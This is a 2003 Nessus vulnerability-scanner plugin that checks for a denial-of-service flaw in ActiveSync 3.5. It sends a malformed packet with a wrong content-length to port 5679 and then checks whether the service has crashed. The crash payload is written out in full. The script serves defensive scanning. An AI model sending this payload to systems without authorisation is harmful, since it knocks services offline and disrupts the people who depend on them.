#
#
# This script was written by Renaud Deraison
#
#
# Ref: 
#
# Subject: IRM 004: ActiveSync Version 3.5 Denial of Service Vulnerability
# From: IRM Advisories <advisories@irmplc.com>
# Reply-To: advisories@irmplc.com
# To: bugtraq@securityfocus.com
# Message-Id: <1048263395.5125.3.camel@Cadmium>
#
#
if(description)
{
 script_id(11435);
 script_bugtraq_id(7150);
 
 script_version ("$Revision: 1.3 $");
 name["english"] = "ActiveSync packet overflow";
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote service (probably ActiveSync) could be crashed
by sending it a malformed packet advertising a wrong content-length.

An attacker may use this flaw to disable this service remotely. It is
not clear at this time if this vulnerability can be used to execute
arbitrary code on this host, although it is a possibility.

Solution : Filter incoming traffic to this port
Risk factor : High";
 
 script_description(english:desc["english"]);
 
 summary["english"] = "Tests for the overflow in ActiveSync";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "Gain a shell remotely";

 script_family(english:family["english"]);
 script_require_ports(5679);
 exit(0);
}


include('global_settings.inc');

if ( report_paranoia < 2 ) exit(0);

port = 5679;
if(get_port_state(port))
{
 str = raw_string(0x06, 0x00, 0x00, 0x00,
    		 0x24, 0x00, 0x00, 0x00) + crap(124);


 soc = open_sock_tcp(port);
 if(!soc)exit(0);

 send(socket:soc, data:str);
 r = recv(socket:soc, length:1024);
 close(soc);

 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port);
}


